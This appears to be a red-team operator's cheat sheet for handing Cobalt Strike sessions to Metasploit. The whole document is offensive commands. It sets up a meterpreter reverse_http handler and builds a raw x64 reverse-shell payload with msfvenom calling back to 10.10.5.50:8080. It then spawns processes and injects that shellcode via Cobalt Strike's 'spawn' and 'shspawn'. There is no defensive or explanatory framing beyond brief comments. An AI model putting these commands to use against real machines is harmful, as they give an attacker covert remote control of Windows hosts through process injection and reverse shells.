# Foreign listener (meterpreter)

```bash
# Create a meterpreter listener on kali
sudo msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST ens5
set LPORT 8080
run


# In Cobalt Strike create a new Foreign listener
# Give the same HOST and PORT as meterpreter and set name to anything (msf here)
spawn msf
# spawn a process and inject Meterpreter shellcode into it
```

---

# Spawn and inject

```bash
# Create a meterpreter listner on Kali
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
set LHOST ens5
set LPORT 8080
run

# On Kali create a injection with msfvenom
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# Use the msfvenom payload to spawn a new process and inject it
shspawn x64 C:\Payloads\msf_http_x64.bin
```
